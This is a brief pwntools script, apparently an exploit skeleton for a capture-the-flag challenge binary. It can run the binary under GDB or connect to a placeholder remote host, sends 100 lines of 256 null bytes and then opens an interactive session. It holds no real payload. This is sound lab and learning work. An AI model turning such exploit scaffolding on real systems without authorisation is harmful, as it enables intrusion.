from pwn import *

exe = ELF('./env/chal/src/chal')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        continue
    """)
elif args.REMOTE:
    io = remote("addr", 1337)

for _ in range(100):
    io.sendline(b'\x00' * 0x100)
io.interactive()
